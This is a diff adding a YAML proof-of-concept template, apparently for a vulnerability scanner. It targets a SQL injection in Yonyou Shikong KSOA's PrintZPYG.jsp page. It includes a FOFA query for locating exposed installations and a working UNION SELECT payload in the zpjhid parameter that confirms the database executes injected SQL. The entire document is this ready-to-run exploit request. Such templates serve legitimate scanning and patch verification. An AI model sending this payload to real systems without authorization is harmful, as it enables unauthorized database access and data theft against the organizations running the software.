@@ -1,0 +1,26 @@
+id: poc-yaml-yongyou-ksoa-printzpyg-jsp-sqli
+info:
+  name: 用友时空KSOA PrintZPYG.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友时空KSOA
+  fofa: app="用友-时空KSOA"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+  t3: gbk_encode("工作内容")
+  t4: gbk_encode("人员增补申请表")
+requests:
+- method: GET
+  path: /kp/PrintZPYG.jsp?zpjhid=1%27+union+select+1,2,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{.t1}}%27)),4,5,6,7,8,9,10,11,12,13,14+--+
+  expression: 'status_code == 200 &&
+
+    contains(body,t2) &&
+
+    contains(body,t3) &&
+
+    contains(body,t4)
+
+    '
+transport: http
